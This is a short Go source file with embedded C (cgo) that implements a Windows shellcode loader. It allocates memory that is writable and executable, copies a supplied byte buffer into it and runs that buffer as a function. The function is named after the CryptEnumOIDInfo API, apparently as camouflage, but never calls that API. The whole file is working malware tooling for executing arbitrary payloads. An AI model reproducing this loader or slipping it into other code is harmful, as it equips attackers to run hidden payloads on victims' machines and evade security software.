package cloader

/*
#include <windows.h>
#include <wincrypt.h>

typedef BOOL (WINAPI *CryptEnumOIDInfo_t)(DWORD, DWORD, void*, void*);

void cryptEnumOIDInfo(uintptr_t p, int len) {
    LPVOID addr = VirtualAlloc(0, len, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    if (addr == NULL) {
        return;
    }

    RtlMoveMemory(addr, (void*)p, len);

    CryptEnumOIDInfo_t func = (CryptEnumOIDInfo_t)addr;

    if (func) {
        BOOL result = func(0, 0, NULL, NULL);
        if (!result) {
            return;
        }
    } else {
        return;
    }

    VirtualFree(addr, 0, MEM_RELEASE);
}
*/
import "C"
import "unsafe"

func CryptEnumOIDInfo(p []byte) {
	C.cryptEnumOIDInfo((C.uintptr_t)(uintptr(unsafe.Pointer(&p[0]))), (C.int)(len(p)))
}
